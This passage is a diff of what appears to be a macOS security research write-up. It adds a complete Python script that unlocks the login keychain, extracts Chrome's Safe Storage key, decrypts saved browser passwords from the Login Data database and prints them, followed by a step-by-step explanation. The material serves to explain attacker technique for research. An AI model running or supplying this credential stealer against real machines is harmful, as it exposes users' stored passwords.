@@ -105,3 +105,52 @@ Apple's fix, by the way, consists of a new keychain item called `com.apple.scope
 One idea that comes to mind is using the same concept of redefining a keychain item to control secrets.  
 Usually that would be pointless, as attackers usually want to *steal* secrets rather than controlling new secrets, but it might help for some scenarios.  
 One such scenario is how private data is stored in Chromium-based browsers.  
+Let's see how attackers "normally" steal credentials:
+```python
+import subprocess
+import sqlite3
+import hashlib
+import base64
+import binascii
+
+password = '' # Current user password goes here!
+
+def decrypt_password(password, key):
+    """
+        Decrypts an encrypted password using the given key.
+    """
+
+    retval = ''
+    if password != b'':
+        iv = '20'*16
+        master_key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003) # Salt and iterations taken from chrome's source os_crypt_mac.mm.
+        master_key = master_key[:16]
+        hex_key = binascii.hexlify(master_key)
+        enc_password = base64.b64encode(password[3:])
+        return subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hex_key.decode('utf-8'), enc_password.decode('utf-8')), shell=True).decode('utf-8')
+    return retval
+
+# Get the encryption key by unlocking the keychain
+login_data_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
+subprocess.check_output(['security', 'unlock-keychain', '-p', password, os.path.expanduser('~/Library/Keychains/login.keychain-db')])
+encryption_key = subprocess.check_output(['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w', os.path.expanduser('~/Library/Keychains/login.keychain-db')]).decode().replace('\n', '').encode()
+
+# Fetch login data saved in Chrome
+with sqlite3.connect(login_data_path) as conn:
+    cursor = conn.cursor()
+    querystr = 'SELECT origin_url, username_value, password_value FROM logins'
+    cursor.execute(querystr)
+    for row in cursor.fetchall():
+        url, username, encrypted_password = row
+        password = decrypt_password(encrypted_password, encryption_key)
+        print(f'Action URL: {url}')
+        print(f'Username: {username}')
+        print(f'Password: {password}\n')
+```
+
+This looks like a lot - let's talk about the important parts:
+- The function `decrypt_password` decrypts an encrypted password with the master key `key`. It does so with [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) - essentially "expanding" the secret `key`. It then uses `AES-CBC` to decrypt an encrypted password - this code uses the `openssl` utility but normally an attacker would try to avoid child processes.
+- The main logic gets the login data for Chrome (under `~/Library/Application Support/Google/Chrome/Default/Login Data`) - this is where the encrypted login data (saved data for forms etc.) are saved.
+- Then, it uses the `security` utility to *unlock the keychain* with the user's password - you can see here how one needs the user's password to interact with the keychain. Keychain will remain unlocked for a configurable time.
+- We then use the `security` tool again to find the generic password for the `Chrome Safe Storage` item and use the `-w` flag to read the secret.
+- That secret is then going to be used with `PBKDF` (as described earlier) to decrypt the items from the Login Data.
